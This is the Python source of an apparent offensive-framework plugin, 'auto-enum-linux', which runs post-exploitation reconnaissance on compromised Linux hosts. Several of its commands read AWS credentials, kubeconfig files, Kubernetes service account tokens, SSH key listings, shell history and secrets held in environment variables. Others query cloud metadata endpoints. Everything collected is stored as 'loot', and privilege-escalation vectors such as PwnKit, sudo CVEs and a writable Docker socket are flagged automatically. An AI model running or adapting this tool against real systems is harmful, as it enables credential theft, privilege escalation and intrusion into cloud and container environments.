#!/usr/bin/env python3
"""
NexShell Plugin — Auto Enum Linux v3.0 (2026 Edition)
Full post-exploitation enumeration for modern Linux targets (Cloud, K8s, eBPF).

Collects: Identity, Cloud/K8s context, OS/Kernel, Sudo CVEs, SELinux/AppArmor, 
Systemd timers, SUID/Caps, Docker/Podman, Cloud credentials (IMDS/AWS/Kube).

Usage:
    (NexShell)> plugins run auto-enum-linux
    (NexShell)> plugins run auto-enum-linux --save-only
"""

import re
from core.plugin import NexPlugin


class AutoEnumLinux(NexPlugin):
    name        = "auto-enum-linux"
    description = "Modern Linux post-exploitation enumeration (2025/2026 threats)"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "linux"
    category    = "recon"
    mitre_id    = "T1082"

    # ── Command matrix: (command, loot_category, finding_key, display_label)
    RECON_COMMANDS = [
        # Identity & Cloud Context
        ("id", "credentials", "identity", "Current User"),
        ("whoami", "credentials", None, "Username"),
        ("curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null", "credentials", "imds_aws", "AWS IMDS (169.254.169.254)"),
        ("curl -s -m 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null", "credentials", "imds_gcp", "GCP IMDS"),
        ("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null", "credentials", "k8s_token", "K8s ServiceAccount Token"),
        ("ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null", "credentials", "k8s_sa_dir", "K8s SA Directory"),

        # OS, Kernel & Security Modules
        ("uname -a", "custom", "kernel", "Kernel Version"),
        ("cat /etc/os-release 2>/dev/null || cat /etc/issue", "custom", "os_info", "OS Release"),
        ("getenforce 2>/dev/null", "custom", "selinux", "SELinux Status"),
        ("aa-status 2>/dev/null | head -20", "custom", "apparmor", "AppArmor Status"),
        ("mokutil --sb-state 2>/dev/null", "custom", "secureboot", "Secure Boot Status"),

        # Users & Sudo (Modern CVEs)
        ("cat /etc/passwd | grep -v 'nologin\\|false'", "credentials", "users", "Valid Users"),
        ("sudo -l 2>/dev/null", "credentials", "sudo", "Sudo Rights"),
        ("sudo --version 2>/dev/null | head -1", "privesc", "sudo_version", "Sudo Version (CVE Check)"),
        ("pkexec --version 2>/dev/null", "privesc", "pkexec_version", "Pkexec Version (PwnKit Check)"),

        # Network
        ("ip addr 2>/dev/null || ifconfig 2>/dev/null", "network", "interfaces", "Network Interfaces"),
        ("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null", "network", "open_ports", "Listening Ports"),
        ("cat /etc/hosts", "network", "hosts_file", "/etc/hosts"),

        # Processes, Systemd & eBPF
        ("ps aux 2>/dev/null | head -30", "custom", None, "Running Processes"),
        ("systemctl list-timers --all 2>/dev/null | head -20", "custom", "systemd_timers", "Systemd Timers"),
        ("bpftool prog list 2>/dev/null | head -20", "custom", "ebpf_progs", "eBPF Programs (EDR/Rootkits)"),

        # Cron & Modern Persistence
        ("crontab -l 2>/dev/null", "custom", "crontab", "User Crontab"),
        ("cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v '^#'", "custom", "system_cron", "System Crons"),
        ("ls -la /etc/systemd/system/ 2>/dev/null | grep -E 'timer|service'", "custom", "systemd_units", "Systemd Units"),

        # SUID / SGID / Capabilities
        ("find / -perm -4000 -type f 2>/dev/null", "privesc", "suid", "SUID Binaries"),
        ("find / -perm -2000 -type f 2>/dev/null", "privesc", "sgid", "SGID Binaries"),
        ("getcap -r / 2>/dev/null | head -20", "privesc", "capabilities", "Linux Capabilities"),

        # Containers & Escapes
        ("ls -la /var/run/docker.sock 2>/dev/null", "privesc", "docker_sock", "Docker Socket"),
        ("docker ps 2>/dev/null || podman ps 2>/dev/null", "custom", "containers", "Running Containers"),
        ("cat /proc/1/cgroup 2>/dev/null | grep -iE 'docker|kubepods|containerd'", "custom", "container_check", "Container Check"),

        # Secrets & Cloud Credentials
        ("find /home /root /opt -name '.aws' -o -name '.kube' -o -name '.azure' -o -name '.gcloud' -type d 2>/dev/null", "credentials", "cloud_dirs", "Cloud Config Dirs"),
        ("cat ~/.aws/credentials 2>/dev/null", "credentials", "aws_creds", "AWS Credentials"),
        ("cat ~/.kube/config 2>/dev/null", "credentials", "kube_config", "Kubeconfig"),
        ("find / -name '*.env' -o -name 'wp-config.php' -o -name 'config.php' 2>/dev/null | head -10", "credentials", "app_configs", "App Config Files"),
        ("ls -la ~/.ssh/ 2>/dev/null", "credentials", "ssh_keys", "SSH Keys"),
        ("cat ~/.bash_history 2>/dev/null | tail -30", "credentials", "shell_history", "Bash History"),
        ("env | grep -iE 'pass|key|secret|token|aws|api'", "credentials", "env_secrets", "Env Secrets"),
    ]

    # Patterns that trigger automatic findings
    FINDING_PATTERNS = {
        "sudo": [
            (r"NOPASSWD", "High", "Sudo NOPASSWD configured",
             "User can run sudo commands without a password — privilege escalation vector."),
            (r"\(ALL\)", "Medium", "Unrestricted sudo access",
             "User has broad sudo access. Review for unnecessary privileges."),
        ],
        "sudo_version": [
            (r"1\.9\.([0-9]|1[0-1])", "High", "Sudo Vulnerable to CVE-2023-22809",
             "Sudo version < 1.9.12p2. Vulnerable to sudoedit bypass (learnfile injection)."),
        ],
        "pkexec_version": [
            (r"polkit.*0\.(10[0-9]|11[0-3])", "High", "Pkexec Vulnerable to PwnKit (CVE-2021-4034)",
             "Polkit version < 0.114. Vulnerable to local privilege escalation."),
        ],
        "suid": [
            (r"/usr/bin/(vim|python|perl|ruby|bash|sh|nmap|find|cp|mv|cat|less|more|env|awk|sed|systemctl|docker)",
             "High", "Common GTFOBins SUID Binary",
             "SUID binary is in GTFOBins — very likely privilege escalation vector. Check: https://gtfobins.github.io"),
        ],
        "capabilities": [
            (r"cap_setuid|cap_net_raw|cap_sys_admin|cap_dac_override",
             "High", "Dangerous Linux Capability",
             "Process capability allows privilege escalation (cap_setuid/cap_sys_admin)."),
        ],
        "docker_sock": [
            (r"srw-rw----", "Critical", "Docker Socket Accessible",
             "Docker socket is writable. Allows trivial root escalation via container breakout."),
        ],
        "imds_aws": [
            (r"ami-id|instance-id|local-ipv4", "High", "AWS IMDS Accessible",
             "AWS Instance Metadata Service is accessible. Can be used to steal IAM credentials (T1552.005)."),
        ],
        "imds_gcp": [
            (r"computeMetadata", "High", "GCP IMDS Accessible",
             "GCP Metadata server is accessible. Can be used to steal service account tokens."),
        ],
        "k8s_token": [
            (r"eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+", "Critical", "Kubernetes ServiceAccount Token Found",
             "K8s JWT token found in standard path. Can be used to authenticate to the API server."),
        ],
        "selinux": [
            (r"Permissive|Disabled", "Medium", "SELinux Not Enforcing",
             "SELinux is in Permissive mode or Disabled. Mandatory Access Control is not active."),
        ],
        "apparmor": [
            (r"0 profiles are loaded|apparmor module is disabled", "Medium", "AppArmor Not Active",
             "AppArmor is disabled or has no profiles loaded."),
        ],
        "ssh_keys": [
            (r"id_rsa|id_ed25519|id_ecdsa", "High", "SSH Private Key Found",
             "SSH private key discovered — potential lateral movement / privilege escalation."),
        ],
        "container_check": [
            (r"docker|kubepods|containerd", "Info", "Running Inside Container",
             "Target is inside a Docker/K8s/containerd container. Check for container escape vectors."),
        ],
        "env_secrets": [
            (r"(?i)(password|secret|key|token)\s*=\s*\S+", "High", "Secret in Environment Variable",
             "Sensitive credential found in environment variables."),
        ],
        "shell_history": [
            (r"(?i)(pass|secret|key|token|aws|api)\S*\s*=", "Medium", "Credential in Shell History",
             "Shell history contains potential credentials or secrets."),
        ],
    }

    def run(self, session, args: list):
        save_only = '--save-only' in (args or [])
        quiet     = '--quiet'     in (args or [])

        self.info("Starting auto-enum-linux v3.0 (2026 Edition) ...")
        sections   = []
        collected  = {}   # finding_key -> output text

        for cmd, loot_cat, fkey, label in self.RECON_COMMANDS:
            try:
                out = self._exec(session, cmd)
                if not out.strip():
                    continue

                # Store output for pattern matching
                if fkey:
                    collected[fkey] = out

                # Save to loot DB
                self.loot(out, category=loot_cat, source=f"auto-enum:{cmd[:40]}")

                # Format section
                if not save_only:
                    sections.append(f"\n{'━'*64}")
                    sections.append(f"  [{label}]  $ {cmd[:60]}")
                    sections.append('━'*64)
                    sections.append(out.strip()[:800])

            except Exception as e:
                if not quiet:
                    self.warn(f"Cmd failed: {cmd[:40]}: {e}")

        # ── Auto-create findings based on patterns ───────────────────────────
        findings_created = 0
        for fkey, patterns in self.FINDING_PATTERNS.items():
            text = collected.get(fkey, '')
            if not text:
                continue
            for pattern, severity, title, recommendation in patterns:
                if re.search(pattern, text, re.MULTILINE | re.IGNORECASE):
                    self.finding(
                        title          = title,
                        description    = f"Detected in [{fkey}]: {pattern}\n\nOutput snippet:\n{text[:400]}",
                        severity       = severity,
                        recommendation = recommendation,
                        mitre_id       = self.mitre_id,
                    )
                    self.emit('finding.created', severity=severity, title=title, plugin=self.name)
                    findings_created += 1

        # ── Add timeline event ────────────────────────────────────────────────
        host = getattr(getattr(session, 'host', None), '__str__', lambda: 'unknown')()
        self.emit('timeline.event', title=f"Auto-enum Linux on {host}",
                  type='recon', plugin=self.name)

        return '\n'.join(sections) if sections else "(save-only mode: all output saved to loot)"